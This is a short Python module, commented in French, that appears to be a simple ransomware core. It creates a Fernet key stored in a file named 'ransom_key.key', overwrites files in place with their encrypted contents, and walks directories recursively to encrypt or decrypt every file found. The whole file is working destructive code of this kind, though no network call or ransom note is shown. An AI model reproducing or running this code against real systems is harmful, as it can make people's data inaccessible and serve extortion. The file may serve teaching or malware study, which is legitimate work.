from cryptography.fernet import Fernet
import os
from cryptography.fernet import InvalidToken

KEY_FILE = "ransom_key.key"

# Génère une nouvelle clé et la sauvegarde
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

# Charge la clé existante depuis le fichier
def load_key():
    return open(KEY_FILE, "rb").read()

# Chiffre un fichier avec la clé
def encrypt_file(file_path, key):
    f = Fernet(key)
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted = f.encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted)
    except PermissionError:
        print(f"[!] Permission refusée pour {file_path}, ignoré.")
    except Exception as e:
        print(f"[!] Erreur sur {file_path} : {e}")


# Déchiffre un fichier
def decrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        data = file.read()
    try:
        decrypted = f.decrypt(data)
        with open(file_path, "wb") as file:
            file.write(decrypted)
    except InvalidToken:
        print(f"[!] Le fichier {file_path} n'a pas pu être déchiffré (clé invalide ou non chiffré).")

    

# Chiffre tous les fichiers d’un dossier (récursivement)
def encrypt_directory(directory, key):
    for root, _, files in os.walk(directory):
        for name in files:
            path = os.path.join(root, name)
            encrypt_file(path, key)

# Déchiffre tous les fichiers d’un dossier (récursivement)
def decrypt_directory(directory, key):
    for root, _, files in os.walk(directory):
        for name in files:
            path = os.path.join(root, name)
            decrypt_file(path, key)
